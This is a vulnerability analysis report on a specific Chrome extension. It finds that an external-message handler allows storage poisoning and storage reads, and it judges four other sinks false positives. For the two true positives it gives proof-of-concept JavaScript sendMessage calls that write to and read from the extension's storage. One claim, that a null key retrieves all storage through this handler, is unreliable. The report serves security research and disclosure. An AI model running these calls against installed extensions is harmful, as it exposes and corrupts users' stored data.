# CoCo Analysis: cmlkmalcjcbmledhdedbljhfejciicbh

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 6

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/cmlkmalcjcbmledhdedbljhfejciicbh/opgen_generated_files/bg.js
Line 1197    body: JSON.stringify(request.data),
Line 1253    data[request.key] = JSON.parse(request.data);

**Code:**

```javascript
// background.js - Entry point
chrome.runtime.onMessageExternal.addListener(
  function (request, sender, sendResponse) { // ← External message handler
    // ... other handlers ...

    if (request.type === 'SetStorage') { // ← Attacker-controlled type
      const data = {};
      data[request.key] = JSON.parse(request.data); // ← Attacker-controlled key and data
      chrome.storage.local.set(data, function (res) { // ← Storage sink
        if (!chrome.runtime.error) {
          sendResponse(data);
          return true;
        }
      });
    } else if (request.type === 'GetStorage') { // ← Retrieval path
      chrome.storage.local.get(request.data.key, function (res) { // ← Attacker-controlled key
        if (!chrome.runtime.error) {
          sendResponse(res[request.data.key]); // ← Sends storage back to attacker
          return true;
        }
      });
    }
  }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any whitelisted domain (ea.com, easports.com, futalert.co.uk) or malicious extension:

// Step 1: Poison storage with arbitrary data
chrome.runtime.sendMessage(
  'cmlkmalcjcbmledhdedbljhfejciicbh', // Extension ID
  {
    type: 'SetStorage',
    key: 'malicious_key',
    data: '{"exploit": "attacker_data"}'
  },
  function(response) {
    console.log('Storage poisoned:', response);
  }
);

// Step 2: Retrieve poisoned data
chrome.runtime.sendMessage(
  'cmlkmalcjcbmledhdedbljhfejciicbh',
  {
    type: 'GetStorage',
    data: { key: 'malicious_key' }
  },
  function(response) {
    console.log('Retrieved data:', response); // Attacker receives their poisoned data
  }
);
```

**Impact:** Complete storage exploitation chain. External attacker (from whitelisted domains or malicious extension) can write arbitrary data to extension storage and retrieve it back. This allows persistent data poisoning and information disclosure. The attacker can manipulate extension behavior by poisoning configuration data, and can exfiltrate any data stored by the extension.

---

## Sinks 2-5: fetch_source → sendResponseExternal_sink

**CoCo Trace:**
Multiple instances where extension fetches from hardcoded backend and sends response to external caller.

**Code:**

```javascript
// Example from line 1190-1217
if (request.type === 'FetchPlayerPrices') {
  const url = 'https://apisf.futalert.co.uk/api/Player/FetchPlayerPrices'; // Hardcoded backend
  fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(request.data),
  })
  .then((response) => response.json())
  .then((res) => {
    sendResponse({ success: true, res: res }); // Send backend response to caller
  });
}
```

**Classification:** FALSE POSITIVE

**Reason:** Data flows FROM hardcoded backend URL (apisf.futalert.co.uk) to external caller. While external parties can trigger these requests, the data originates from the developer's trusted infrastructure. The extension acts as a proxy to its own backend API. Per methodology Rule 3, data from hardcoded developer backend URLs is trusted infrastructure.

---

## Sink 6: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/cmlkmalcjcbmledhdedbljhfejciicbh/opgen_generated_files/bg.js
Line 752    'key': 'value'

**Code:**

```javascript
// Part of same handler as Sink 1
chrome.runtime.onMessageExternal.addListener(
  function (request, sender, sendResponse) {
    if (request.type === 'GetStorage') { // ← Attacker-controlled
      chrome.storage.local.get(request.data.key, function (res) { // ← Read from storage
        if (!chrome.runtime.error) {
          sendResponse(res[request.data.key]); // ← Send to attacker
          return true;
        }
      });
    }
  }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any whitelisted domain or malicious extension:

// Read any storage key
chrome.runtime.sendMessage(
  'cmlkmalcjcbmledhdedbljhfejciicbh',
  {
    type: 'GetStorage',
    data: { key: null } // null retrieves all storage
  },
  function(response) {
    console.log('All extension storage:', response); // Attacker receives all stored data
  }
);
```

**Impact:** Information disclosure. External attacker can read arbitrary keys from extension storage, including sensitive user data, authentication tokens, or configuration. Combined with Sink 1, this creates a complete read/write exploitation chain for the extension's storage.
